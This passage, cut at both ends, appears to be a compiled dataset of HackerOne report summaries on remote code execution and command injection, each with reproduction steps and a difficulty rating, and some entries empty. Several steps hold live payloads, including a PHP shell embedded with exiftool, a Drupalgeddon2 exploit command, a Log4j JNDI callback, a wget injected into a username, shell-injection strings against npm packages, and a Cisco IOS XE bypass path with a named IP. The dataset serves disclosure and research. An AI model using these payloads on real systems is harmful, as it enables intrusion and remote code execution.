The vulnerability involves understanding the deserialization process in DNN, crafting a specific payload using YSoSerial.net, and manipulating the DNNPersonalization cookie. While the steps are straightforward once the payload is generated, the initial discovery of the vulnerability and the creation of the exploit require knowledge of deserialization flaws and the specific DNN implementation.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/346516: Remote code executio in  NPM package getcookies
================================================================================
Vulnerability Description:
The vulnerability allows remote code execution through the getcookies NPM package by injecting and executing arbitrary JavaScript code via specially crafted HTTP headers. The package's test harness contains a hidden functionality that processes these headers to store and execute code in the server's context.

Steps to Reproduce:
1. Set up a Node.js server using the express-cookies package which depends on getcookies.
2. Send a crafted HTTP request with malicious code in custom headers using the format 'g<bytePosition>h<codeBytes>i' to inject code into the server's memory.
3. Trigger the execution of the injected code by sending another crafted HTTP request with the header 'gfaffh636465i'.
Exploitation Difficulty:
The vulnerability involves understanding and manipulating a hidden feature in the package's test harness, which is not documented or intended for production use. The attacker needs to craft specific HTTP headers to inject and execute code, which requires knowledge of the package's internal workings.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/350401: Insecure implementation of deserialization in funcster
================================================================================
Vulnerability Description:
The funcster package allows arbitrary code execution during deserialization of JSON due to its insecure implementation of function deserialization. An attacker can craft a malicious JSON payload with an IIFE that executes code during the deserialization process, leading to remote code execution.

Steps to Reproduce:
1. Install the funcster package: `npm install funcster`
2. Create a malicious JSON payload with an IIFE (Immediately-Invoked Function Expression) that executes arbitrary code during deserialization
3. Use the funcster.deepDeserialize method to deserialize the malicious JSON payload, triggering the code execution
Exploitation Difficulty:
The vulnerability requires understanding of JavaScript's function serialization/deserialization, IIFE exploitation, and the specific implementation details of the funcster package. The attack involves crafting a non-trivial payload that bypasses built-in object restrictions to achieve code execution.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/357858: forum.getmonero.org Shell upload
================================================================================
Vulnerability Description:
The vulnerability allows an attacker to upload a malicious PHP shell disguised as an image file to the server due to insufficient file type validation in the profile picture upload feature. This leads to remote code execution by accessing the uploaded PHP file.

Steps to Reproduce:
1. Embed a shell into an image using exiftool: exiftool -documentname='<?php echo file_get_contents("/etc/passwd"); ?>' picture.png
2. Rename the image to .php extension and upload it to the forum.getmonero.org profile picture upload feature
Exploitation Difficulty:
The attack involves a simple file upload bypass technique that is well-documented and commonly exploited. The only non-trivial step is extracting the timestamp from the error response to locate the uploaded file, but this is a straightforward process.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/532667: Server Side JavaScript Code Injection
================================================================================
Vulnerability Description:
The vulnerability is a Server Side JavaScript Code Injection in fastify, where an attacker controlling a property name in the serialization schema can achieve Remote Command Execution in the context of the web server.

Steps to Reproduce:
1. Identify a property name in the serialization schema that can be controlled by an attacker
2. Inject malicious JavaScript code into the controlled property name during schema definition
Exploitation Difficulty:
The vulnerability requires understanding of the schema serialization process in fastify and the ability to inject code through property names, which is a non-obvious interaction between schema definition and code execution.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/576887: RCE on █████ via CVE-2017-10271
================================================================================
Vulnerability Description:
The vulnerability is a Remote Code Execution (RCE) in Oracle WebLogic Server via CVE-2017-10271. It allows an attacker to execute arbitrary Java code by sending a crafted SOAP request to a vulnerable endpoint. The proof of concept demonstrates this by causing the server to sleep for 12 seconds.

Steps to Reproduce:
1. Send a crafted SOAP request to the vulnerable WebLogic server endpoint at /wls-wsat/RegistrationPortTypeRPC with a sleep payload.
2. Observe the delayed response (12 seconds in this case) to confirm Java code execution.
Exploitation Difficulty:
The attack involves a single, well-documented vulnerability (CVE-2017-10271) with publicly available exploits. The steps to reproduce are straightforward and do not require complex interactions or state manipulation. The vulnerability is well-known and the exploit is not novel.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/608577: CVE-2019-5443: Windows Privilege Escalation: Malicious OpenSSL Engine
================================================================================
Vulnerability Description:
The vulnerability allows privilege escalation on Windows systems where curl is installed. A low-privileged user can create a custom openssl.cnf file in a default insecure path (c:\usr\local\ssl) that loads a malicious OpenSSL Engine DLL. When curl is executed by another user (including higher-privileged accounts), the malicious code runs with the executing user's privileges.

Steps to Reproduce:
1. Create the folder structure: c:\usr\local\ssl
2. Create a malicious openssl.cnf file in c:\usr\local\ssl with engine configuration pointing to a custom DLL
3. Create a folder c:\stage and place a malicious DLL (e.g., calc.dll) there
4. Execute curl.exe as a different user to trigger the malicious DLL loading
Exploitation Difficulty:
While the attack involves multiple components (folder creation, config file crafting, DLL creation), each step is straightforward and well-documented in OpenSSL's configuration syntax. The interaction between curl's OpenSSL path and Windows permissions is non-obvious but follows predictable patterns once understood. The attack doesn't require complex state manipulation or novel logic.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/632721: Root Remote Code Execution on https://███
================================================================================
Vulnerability Description:
Atlassian Crowd has a vulnerability (CVE-2019-11580) where the pdkinstall development plugin is incorrectly enabled in release builds, allowing unauthenticated or authenticated attackers to install arbitrary plugins leading to remote code execution as root.

Steps to Reproduce:
1. Download and unzip the malicious plugin: rce-plugin.zip
2. Run the curl command to upload the plugin to the vulnerable Crowd instance: curl -k -H "Content-Type: multipart/content" --form "file_cdl=@rce.jar;type=application/octet-stream" https://███/crowd/admin/uploadplugin.action
3. Visit the malicious plugin URL to execute arbitrary commands as root: https://███████/crowd/plugins/servlet/hackerone-cdl
Exploitation Difficulty:
The vulnerability involves reverse-engineering the pdkinstall plugin to create a malicious plugin, which requires deep understanding of the plugin architecture and crafting a payload that can be uploaded and executed. However, once the exploit is constructed, the attack steps are straightforward.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/678727: potential RCE and XSS via file upload requiring user account and default settings
================================================================================
Vulnerability Description:
The vulnerability allows a non-admin user to achieve Remote Code Execution (RCE) and Cross-Site Scripting (XSS) by uploading malicious files (PHP or HTML) when the Nextcloud data directory is located within the server's web-accessible folder and the username is predictable. The attacker can execute arbitrary code by accessing the uploaded file directly via its URL.

Steps to Reproduce:
1. Login to a Nextcloud user account (non-admin) that has file upload permissions.
2. Upload a malicious PHP file (e.g., shell.php) to the Nextcloud instance.
3. Navigate to the direct URL of the uploaded PHP file, which follows the pattern: https://[nextcloud-domain]/data/[username]/files/[filename].php
4. Observe the execution of the PHP script, leading to Remote Code Execution (RCE).
Exploitation Difficulty:
The vulnerability involves understanding the default configuration of Nextcloud (data directory location), predictable user directory naming, and the ability to upload executable files. While the steps are straightforward, the attacker must know or guess the server's configuration and the username's directory structure.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/701183: [tree-kill] RCE via insecure command concatenation (only Windows)
================================================================================
Vulnerability Description:
The tree-kill module on Windows is vulnerable to Remote Code Execution (RCE) due to insecure command concatenation of user input without proper sanitization. This allows an attacker to inject arbitrary commands that will be executed on the victim's system.

Steps to Reproduce:
1. Install the vulnerable module: npm i tree-kill
2. Run the PoC script: node poc.js (where poc.js contains the malicious command injection)
Exploitation Difficulty:
The vulnerability is straightforward to discover as it involves basic command injection via unsanitized user input in a command string. The attack does not require complex interactions or state manipulation, and command injection is a well-known vulnerability pattern.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/703412: [node-df] RCE via insecure command concatenation
================================================================================
Vulnerability Description:
The node-df module is vulnerable to Remote Code Execution (RCE) via insecure command concatenation. User-supplied input in the 'file' parameter is directly concatenated into a system command without proper sanitization, allowing attackers to execute arbitrary commands on the host system.

Steps to Reproduce:
1. Install the vulnerable module: npm i node-df
2. Create a PoC file (poc.js) with the malicious options object containing a command injection payload
3. Run the PoC: node poc.js
4. Verify the arbitrary command execution by checking for the created file (HACKED)
Exploitation Difficulty:
This vulnerability is straightforward to discover as it follows a common pattern of command injection vulnerabilities where user input is directly concatenated into system commands. The attack vector is obvious once the command construction pattern is identified in the source code, and no complex application state manipulation is required.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/703415: [treekill] RCE via insecure command concatenation (only Windows)
================================================================================
Vulnerability Description:
The treekill module for Node.js is vulnerable to Remote Code Execution (RCE) on Windows due to insecure command concatenation. User input is directly concatenated into a command that is executed without proper sanitization, allowing an attacker to inject arbitrary commands.

Steps to Reproduce:
1. Install the vulnerable module: npm i tree-kill
2. Create a PoC file (poc.js) with the following content:
var kill = require('treekill');
kill('3333332 & echo "HACKED" > HACKED.txt & ');
3. Run the PoC: node poc.js
4. Verify the attack by checking if HACKED.txt was created: dir
Exploitation Difficulty:
The vulnerability is straightforward to discover as it involves a common pattern of insecure command concatenation. The attack does not require complex interactions or understanding of multiple components. The vulnerable code is easily identifiable in the source file, and the exploitation follows a typical command injection pattern.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/720306: Docker image with FPM is vulnerable to CVE-2019-11043
================================================================================
Vulnerability Description:
The vulnerability CVE-2019-11043 in PHP-FPM allows an attacker to execute arbitrary PHP code on the server. This is due to a flaw in how PHP-FPM processes certain requests, which can be exploited by sending specially crafted URLs to the server.

Steps to Reproduce:
1. Identify the target running Nextcloud with PHP-FPM using the nginx configuration as described in the documentation.
2. Use the exploit tool 'phuip-fpizdam' to test the vulnerability by running the command with the target URL: ./phuip-fpizdam http://localhost:8080/ocs/v2.php
Exploitation Difficulty:
The vulnerability involves understanding the interaction between nginx and PHP-FPM, and requires knowledge of the specific exploit tool. However, the steps to reproduce are straightforward once the tool is known and the target configuration is identified.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/772448: [blamer] RCE via insecure command formatting
================================================================================
Vulnerability Description:
The blamer module is vulnerable to Remote Code Execution (RCE) due to insecure command formatting. User input is directly formatted into a command that is executed without proper sanitization, allowing an attacker to execute arbitrary commands on the victim's system.

Steps to Reproduce:
1. Install the affected module: npm i blamer
2. Run the PoC file: node poc.js (where poc.js contains the malicious input)
Exploitation Difficulty:
The vulnerability is straightforward to discover as it involves a common pattern of insecure command formatting. The attacker only needs to identify the point where user input is incorporated into a command and test for command injection. The interaction is obvious and does not require complex state manipulation or novel logic.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/781664: Several simple remote code execution in pdf-image
================================================================================
Vulnerability Description:
No description available

Steps to Reproduce:
No steps available
Exploitation Difficulty:
None

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/825729: [logkitty] RCE via insecure command formatting
================================================================================
Vulnerability Description:
The vulnerability is a Remote Code Execution (RCE) issue in the logkitty module, where user input is formatted inside a command that is executed without proper sanitization or checks. This allows an attacker to execute arbitrary commands on the victim's system.

Steps to Reproduce:
1. npm i logkitty
2. logkitty android app 'test; touch HACKED'
Exploitation Difficulty:
The vulnerability is straightforward to discover as it involves a common pattern of insecure command formatting where user input is directly incorporated into a command string. The attack does not require multiple components, complex state manipulation, or novel logic.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/841947: Remote Code Execution through Extension Bypass on Log Functionality
================================================================================
Vulnerability Description:
The vulnerability allows remote code execution by bypassing the extension check for log files in the concrete5 CMS. An attacker can set the log file to a .php file and inject malicious PHP code, which is then executed when the file is accessed.

Steps to Reproduce:
1. Login to the administrative panel and navigate to the logging settings page.
2. Intercept the request and modify the handler parameter to bypass the extension check.
3. Change the handler back to 'file' and remove the 'logging_mode' parameter to bypass further checks.
4. Inject PHP code into the log file by attempting to login with a malicious username.
5. Access the malicious log file in the browser to execute the injected code.
Exploitation Difficulty:
The attack involves multiple steps to bypass security checks and manipulate the application state. It requires understanding the interaction between different parameters and the application's logging functionality.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/851807: Code injection possible with malformed Nextcloud Talk chat commands
================================================================================
Vulnerability Description:
The vulnerability allows for arbitrary code execution in Nextcloud Talk by exploiting malformed chat commands. Attackers can inject bash subcommands into command arguments, leading to remote code execution and potential full system compromise.

Steps to Reproduce:
1. Install and setup Nextcloud with Talk app and sample commands
2. Upload a malicious script to a user's Nextcloud files
3. Use chat commands with bash subcommand syntax to execute arbitrary commands (e.g., /wiki test $(id))
4. Use the command execution to locate and modify the uploaded script
5. Execute the script to establish a reverse shell
Exploitation Difficulty:
While the vulnerability involves multiple steps (setting up Nextcloud, uploading files, and executing commands), the core exploit is straightforward once the command injection vector is identified. The bash subcommand injection is a well-known technique, and the attack path is linear without complex state manipulation.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/878420: [windows-edge] RCE via insecure command formatting
================================================================================
Vulnerability Description:
The windows-edge module is vulnerable to Remote Code Execution (RCE) due to insecure command formatting. User input is directly incorporated into a system command without proper sanitization, allowing an attacker to execute arbitrary commands on the victim's system.

Steps to Reproduce:
1. Install the vulnerable module: npm i windows-edge
2. Run the PoC script: node poc.js (where poc.js contains the malicious command injection)
Exploitation Difficulty:
The vulnerability is straightforward to discover as it involves a common command injection pattern where user input is directly concatenated into a system command. The attack does not require complex interactions or understanding of multiple components.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/902739: bunyan - RCE via insecure command formatting
================================================================================
Vulnerability Description:
The vulnerability in bunyan allows for Remote Code Execution (RCE) due to insecure command formatting. An attacker can inject arbitrary commands via user input that is directly executed without proper sanitization or checks.

Steps to Reproduce:
1. Install bunyan: npm install bunyan
2. Execute the vulnerable command: ./node_modules/bunyan/bin/bunyan -p "S'11;touch hacked ;'"
Exploitation Difficulty:
The vulnerability is straightforward to exploit as it involves direct command injection without the need for complex interactions or state manipulations. The attack vector is clear and does not require understanding of multiple components or novel logic.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/962013: Remote Code Execution on █████████
================================================================================
Vulnerability Description:
The vulnerability involves an unauthenticated Apache Solr instance (version 5.5.1) that is susceptible to CVE-2019-0193, allowing an attacker to achieve Remote Code Execution (RCE) by manipulating the Solr configuration and exploiting the data import handler feature.

Steps to Reproduce:
1. Access the Solr admin interface at the vulnerable URL (e.g., https://██████/solr/)
2. Navigate to the Core Admin section and copy the path
3. Update the Solr configuration to include a malicious data import handler
4. Execute arbitrary code via the data import handler to achieve Remote Code Execution (RCE)
Exploitation Difficulty:
The attack involves multiple straightforward steps, including accessing an unauthenticated interface, modifying configuration files, and executing code. The steps are well-documented and do not require complex interactions or novel logic.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/972220: [arpping] Remote Code Execution
================================================================================
Vulnerability Description:
No description available

Steps to Reproduce:
No steps available
Exploitation Difficulty:
None

--------------------------------------------------------------------------------



Command Injection - Generic Vulnerabilities (46 reports)
--------------------------------------------------

Report https://hackerone.com/reports/1063256: [CVE-2018-7600] Remote Code Execution due to outdated Drupal server on www.█████████
================================================================================
Vulnerability Description:
Due to an outdated Drupal version (7.54), remote code execution is possible via CVE-2018-7600. This vulnerability allows attackers to execute arbitrary code on the server due to an issue affecting multiple subsystems with default or common module configurations.

Steps to Reproduce:
1. Download the exploit from the git repository: git clone https://github.com/dreadlocked/Drupalgeddon2.git && cd Drupalgeddon2
2. Run the exploit with the command: ruby drupalgeddon2-customizable-beta.rb -u https://www.████████/ -v 7 -c id --form user/login
Exploitation Difficulty:
The attack involves using a publicly available exploit script against a known vulnerability in an outdated Drupal version. The steps are straightforward and do not require complex interactions or novel logic.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/1492896: CVE-2022-24288: Apache Airflow: TWO RCEs in example DAGs
================================================================================
Vulnerability Description:
The vulnerability involves command injection in Apache Airflow's example DAGs (example_passing_params_via_test_command.py and tutorial.py) due to insufficient sanitization of user-supplied parameters in Jinja2 templates. Attackers can exploit this to execute arbitrary commands on the system, especially when Airflow is configured for unauthenticated access.

Steps to Reproduce:
1. Navigate to the DAGs menu in Apache Airflow and select 'example_passing_params_via_test_command' task.
2. Trigger the DAG with a custom configuration that includes malicious parameters (e.g., 'Foo' or 'MIFF') to execute arbitrary commands.
3. Navigate to the DAGs menu and select 'tutorial' task.
4. Trigger the DAG with a custom configuration that includes a malicious parameter (e.g., 'my_param') to execute arbitrary commands.
Exploitation Difficulty:
The vulnerability is straightforward to discover as it involves common command injection patterns in templated parameters. The attack does not require complex interactions or state manipulation, and the exploitation steps are direct and well-documented in the context of web applications and template engines.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/1609965: RCE via the DecompressedArchiveSizeValidator and Project BulkImports (behind feature flag)
================================================================================
Vulnerability Description:
The vulnerability allows remote code execution through improper shell command construction in the DecompressedArchiveSizeValidator when processing project imports via the Bulk Import feature. The validator passes untrusted input directly to a shell command via Open3.popen3, enabling command injection when the bulk_import_projects feature is enabled.

Steps to Reproduce:
1. Enable the bulk_import_projects feature flag in GitLab's Rails console
2. Use the Bulk Import feature to import a project with a malicious import_source parameter containing shell commands
3. Wait for the import process to reach the decompressed archive validation step
4. Observe command execution when the vulnerable validator processes the malicious input
Exploitation Difficulty:
This vulnerability requires understanding multiple complex components: the bulk import pipeline, project creation service, import/export validators, and their subtle interactions. The attacker must chain these components together while navigating feature flags and timing constraints. The command injection vector is non-obvious as it requires specific parameter manipulation through multiple transformation layers.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/1624137: LOGJ4 VUlnerability [HtUS]
================================================================================
Vulnerability Description:
This vulnerability involves the Log4j library (CVE-2021-44228), which allows Remote Code Execution (RCE) via a crafted JNDI lookup in the log message. The attacker can exploit this by sending a specially crafted request to a vulnerable application, which then executes arbitrary code.

Steps to Reproduce:
1. Go to the vulnerable URL: https://█████/?x=${jndi:ldap://${hostName}.uri.xxxxx.burpcollaborator.net/a}
2. Paste the POC code into the parameter and observe the reverse ping back in Burp Collaborator
Exploitation Difficulty:
The attack is straightforward and involves a single, well-documented exploit (Log4Shell). The steps to reproduce are simple and do not require understanding complex interactions or manipulating application states. The exploit is widely known and does not involve novel logic.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/1671140: CVE-2022-38362: Apache Airflow Docker Provider <3.0 RCE vulnerability in example dag
================================================================================
Vulnerability Description:
The vulnerability is a command injection in an example DAG script provided by Apache Airflow's Docker provider. The script uses a user-controlled parameter ('source_location') in a Bash command without proper sanitization, allowing authenticated users to execute arbitrary commands on the Airflow worker host.

Steps to Reproduce:
1. Access the Apache Airflow web interface and navigate to the DAGs menu.
2. Trigger the 'docker_sample_copy_data' task with a crafted payload in the 'source_location' parameter, e.g., {"source_location":";touch /tmp/thisistest;"}.
Exploitation Difficulty:
The vulnerability involves understanding the interaction between user input and command execution in a specific example DAG. While the attack requires authenticated access, the injection itself is straightforward once the vulnerable parameter is identified.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/1679624: Remote Command Execution via Github import
================================================================================
Vulnerability Description:
The vulnerability allows remote command execution via GitHub repository import in GitLab. By manipulating the default_branch field in the GitHub API response, an attacker can inject arbitrary Redis commands. This is possible due to improper handling of Sawyer::Resource objects in GitLab's GitHub importer, which allows method overriding that affects Redis command generation. The attack can be chained with deserialization gadgets to achieve remote code execution.

Steps to Reproduce:
1. Prepare a malicious GitHub repository with a specially crafted default_branch field that overrides to_s and bytesize methods to inject Redis commands.
2. Set up a fake GitHub API server to serve the malicious repository data when GitLab attempts to import it.
3. Trigger the GitHub repository import in GitLab using the API, pointing to the fake GitHub server.
4. Wait for GitLab to process the import and execute the injected Redis commands, which can include deserialization gadgets for RCE.
5. Access the GitLab instance with a manipulated session cookie to trigger the deserialization and execute arbitrary commands.
Exploitation Difficulty:
This vulnerability requires deep understanding of multiple components: GitHub API response handling, Redis protocol generation, Ruby method overriding, and deserialization attacks. The attacker must carefully craft a malicious response that maintains valid structure while containing the exploit payload. The interaction between these components is non-obvious and requires precise manipulation of application state during the import process.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/1705717: POOL_UPGRADE request handler may allow an unauthenticated attacker to remotely execute code on every node in the network. 
================================================================================
Vulnerability Description:
The vulnerability allows an unauthenticated attacker to execute arbitrary code on every node in the network by exploiting a command injection flaw in the POOL_UPGRADE request handler. The handler fails to sanitize user input in the 'package' field, which is then passed to a shell command.

Steps to Reproduce:
1. Identify the undocumented 'package' field in the POOL_UPGRADE request handler in indy-node
2. Craft a malicious POOL_UPGRADE request with a command injection in the 'package' field
3. Send the crafted request to a target node to execute arbitrary code
Exploitation Difficulty:
The vulnerability involves understanding the POOL_UPGRADE request flow, identifying an undocumented field, and crafting a command injection payload. While the attack chain is straightforward once the field is discovered, the initial discovery of the undocumented field and its misuse requires some insight.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/192512: RCE on default Ubuntu Desktop >= 12.10 Quantal
================================================================================
Vulnerability Description:
The vulnerability involves multiple RCE bugs in Canonical's Apport crash report software, which is installed by default on Ubuntu Desktop systems. When a user opens a malicious file, the Apport software processes it insecurely, allowing arbitrary code execution. This affects default installations of Ubuntu Desktop versions 12.10 (Quantal) and later.

Steps to Reproduce:
1. Identify a vulnerability in Canonical's Apport crash report software that allows Remote Code Execution (RCE) on a default Ubuntu Desktop installation (>= 12.10 Quantal).
2. Create a malicious file that triggers the Apport crash report software when opened.
3. Deliver the malicious file to a target user on a default Ubuntu Desktop installation.
4. Upon opening the file, the Apport crash report software executes the malicious payload, leading to RCE.
Exploitation Difficulty:
The attack involves understanding the Apport crash report software's behavior, crafting a malicious file that triggers the vulnerability, and exploiting it to achieve RCE. While the vulnerability itself is not highly complex, the discovery required knowledge of the Apport software's internals and its interaction with the Ubuntu Desktop environment.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/214022: Admin Command Injection via username in user_archive ExportCsvFile
================================================================================
Vulnerability Description:
This vulnerability allows an admin to perform command injection via a modified username in a backup file. The username is used in a gzip command within backticks, and by restoring a backup with a malicious username, the admin can execute arbitrary commands on the server.

Steps to Reproduce:
1. Login as an admin on try.discourse.org
2. Make a backup of the website and download it
3. Extract the contents of the archive
4. Modify one of the usernames of an account you have access to: test.txt;wget mrzioto.com
5. Repackage the archive
6. Upload the modified archive
7. Restore from backup
8. Log into the account you just modified (you can login via email address, so the special characters won't prevent you from logging into it)
9. Send the POST request for creating a user export archive: http://34.205.246.2/export_csv/export_entity.json POST: entity_type=user&entity=user_archive
Exploitation Difficulty:
The attack involves multiple steps including backup manipulation, username modification, and restoring the backup to trigger command injection. The interaction between the backup restoration and the subsequent command execution is non-obvious and requires understanding of the application's internal workings.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/2309291: CVE-2023-41763 Business Elevation of Privilege vulnerability on [.mtn.com]
================================================================================
Vulnerability Description:
The vulnerability is an elevation of privilege issue in Microsoft Skype for Business, where an attacker can exploit missing security updates to gain elevated privileges and potentially access sensitive information. The attack involves injecting a malicious payload through a parameter in a web request, which the server processes insecurely.

Steps to Reproduce:
1. Navigate to https://fec-feweb-ext.mtn.com/lwa/Webpages/LwaClient.aspx
2. Intercept the request using Burp Suite and send it to the repeater
3. Add the parameter 'meeturl=' with a base64 encoded payload: LMN%{1337*1337}#.xx
4. Send the modified request to observe the server's vulnerable response
Exploitation Difficulty:
The attack involves a straightforward injection of a payload through a parameter, which is a common technique. The complexity is low because it does not require understanding complex application states or novel logic, and the steps to reproduce are clear and simple.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/2778350: Cisco IOS XE instance at 41.208.24.174 vulnerable to CVE-2023-20198
================================================================================
Vulnerability Description:
CVE-2023-20198 is an authentication bypass vulnerability in Cisco IOS XE that allows an attacker to reach the webui_wsma_http endpoint without authentication. This enables the execution of arbitrary Cisco IOS commands or configuration changes with Privilege 15 privileges. Further exploitation can escalate privileges to the underlying Linux OS root user.

Steps to Reproduce:
1. Identify the target Cisco IOS XE instance (e.g., 41.208.24.174) using Shodan or similar tools.
2. Intercept the web traffic using a tool like Burp Suite and send the request to the repeater.
3. Exploit the vulnerability by sending crafted requests to the vulnerable endpoint (http://41.208.24.174/%2577eb%2575i_%2577sma_Http) to bypass authentication and execute arbitrary commands or configuration changes.
4. Verify the exploit by checking the response for sensitive configuration data or successful command execution.
Exploitation Difficulty:
The vulnerability involves multiple components, including bypassing Nginx filtering, exploiting SOAP endpoints, and understanding Cisco IOS command syntax. The interaction between these components is non-obvious, requiring knowledge of both web application security and Cisco-specific configurations.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/294147: Mercurial git subrepo lead to arbritary command injection
================================================================================
Vulnerability Description:
A crafted Mercurial repository with a malicious Git subrepository can lead to arbitrary command execution on the user's OS via a .git/hooks/post-update script. This affects Mercurial 4.4 and earlier, particularly when repositories are created programmatically.

Steps to Reproduce:
1. Create a specially malformed Mercurial repository containing a Git subrepository with a malicious .git/hooks/post-update script.
2. Programmatically push this repository to a target system or share it with a victim who uses Mercurial 4.4 or earlier.
Exploitation Difficulty:
The vulnerability requires understanding both Mercurial and Git subrepository interactions, as well as the specific hook mechanism in Git. The attack involves manipulating repository states in a non-obvious way, but the components (hooks, subrepos) are well-documented features.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/298873: Command injection by overwriting authorized_keys file through GitLab import
================================================================================
Vulnerability Description:
The vulnerability allows an attacker to execute arbitrary system commands on the server by exploiting a directory traversal in the GitLab import feature to overwrite the authorized_keys file, leading to remote code execution.

Steps to Reproduce:
1. Sign in to a GitLab instance with GitLab import enabled.
2. Intercept network traffic and upload a GitLab import file with a malicious path parameter to traverse directories and overwrite the authorized_keys file.
3. Use the overwritten authorized_keys file to execute arbitrary commands via SSH.
Exploitation Difficulty:
The attack involves multiple components including directory traversal, file upload manipulation, and SSH command execution. It requires understanding of GitLab's file handling and SSH key management, but the steps are somewhat linear once the initial vulnerability is identified.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/315773: Remote Command Execution vulnerability in pullit
================================================================================
Vulnerability Description:
The pullit npm package is vulnerable to remote command execution via malicious branch names due to insecure use of execSync() without proper input sanitization. An attacker can craft a branch name containing shell metacharacters that get executed when a user checks out the branch using pullit.

Steps to Reproduce:
1. Create a malicious branch name containing command injection: `git checkout -b ";{echo,hello,world}>/tmp/c"`
2. Run `pullit` and select the malicious branch to trigger command execution
Exploitation Difficulty:
The vulnerability involves understanding git branch naming conventions and shell command injection techniques, but the attack path is straightforward once these components are known. The interaction between branch names and shell execution is a well-documented vulnerability pattern.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/319467: `macaddress` concatenates unsanitized input into exec() command
================================================================================
Vulnerability Description:
The `macaddress` module's `.one(iface, callback)` API does not sanitize the `iface` argument before concatenating it into a shell command passed to `exec()`. This allows command injection if the `iface` parameter is user-controlled.

Steps to Reproduce:
1. let iface = '../../../etc/passwd; touch /tmp/poof; echo ';
2. require('macaddress').one(iface, function (err, mac) { console.log("Mac address for this host: %s", mac); });
Exploitation Difficulty:
The vulnerability is straightforward to discover as it involves a common pattern of unsanitized input being used in command execution. The attack vector is direct and doesn't require complex interactions or state manipulation.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/319473: [open] concatenation of unsanitized input into exec() command
================================================================================
Vulnerability Description:
The 'open' npm package is vulnerable to command injection due to improper sanitization of URLs before they are concatenated into an exec() command. This allows an attacker to execute arbitrary shell commands by crafting malicious URLs.

Steps to Reproduce:
1. Install the 'open' npm package (version 0.0.5 or vulnerable versions)
2. Run the following command in Node.js: require("open")("http://example.com/`touch /tmp/tada`");
3. Check if the file '/tmp/tada' was created on the system
Exploitation Difficulty:
The vulnerability is straightforward to discover as it involves a common pattern of command injection through unsanitized input in a shell command. The attack does not require multiple components or complex interactions, and the exploitation method is well-known in security research.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/319476: `whereis` concatenates unsanitized input into exec() command
================================================================================
Vulnerability Description:
No description available

Steps to Reproduce:
No steps available
Exploitation Difficulty:
None

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/324453: `command-exists` concatenates unsanitized input into exec()/execSync() commands
================================================================================
Vulnerability Description:
The `command-exists` module concatenates unsanitized input into `exec()`/`execSync()` commands, allowing command injection. An attacker can execute arbitrary shell commands by crafting a malicious command name.

Steps to Reproduce:
1. const commandExists = require('command-exists');
2. commandExists.sync('ls; touch /tmp/foo0');
3. commandExists('ls; touch /tmp/foo1');
Exploitation Difficulty:
The vulnerability is straightforward to discover as it involves a common pattern of unsanitized input being passed to shell commands. The attack does not require multiple components, complex state manipulation, or novel logic.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/324491: `fs-path` concatenates unsanitized input into exec()/execSync() commands
================================================================================
Vulnerability Description:
The `fs-path` module concatenates unsanitized user input into `exec()`/`execSync()` commands, allowing command injection. This vulnerability enables an attacker to execute arbitrary shell commands when performing file operations like copying files.

Steps to Reproduce:
1. Install the vulnerable package: `npm install fs-path@0.0.24`
2. Create a test file with malicious input: `const fsPath = require('fs-path'); const source = '/bin/ls'; const target = '/tmp/foo;rm	/tmp/foo;whoami>	/tmp/bar'; fsPath.copySync(source, target);`
3. Observe that `/tmp/bar` is created with the output of the `whoami` command
Exploitation Difficulty:
The vulnerability is straightforward to discover as it involves a common pattern of unsanitized input being passed to shell commands. The attack requires no complex interactions or state manipulation, just the identification of the vulnerable function and crafting a simple payload.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/330957: [pdfinfojs] Command Injection on filename parameter
================================================================================
Vulnerability Description:
The 'pdfinfojs' module is vulnerable to command injection via the filename parameter, which is appended to a command without proper input sanitization, allowing arbitrary command execution.

Steps to Reproduce:
1. Install the module: npm install pdfinfojs
2. Run the example code with a malicious filename payload: node index.js
Exploitation Difficulty:
The vulnerability is straightforward to discover as it involves a common pattern of unsanitized user input being used in a command execution context, a well-known security issue in Node.js modules.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/341869: [entitlements] Command injection on the 'path' parameter
================================================================================
Vulnerability Description:
No description available

Steps to Reproduce:
No steps available
Exploitation Difficulty:
None

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/365271: Remote code execution on Basecamp.com
================================================================================
Vulnerability Description:
A critical flaw in Basecamp's profile image upload function allows remote code execution due to improper handling of PostScript/EPS files disguised as GIFs. The server uses ImageMagick/GraphicsMagick, which invokes Ghostscript for processing, and the outdated Ghostscript version is vulnerable to CVE-2017-8291.

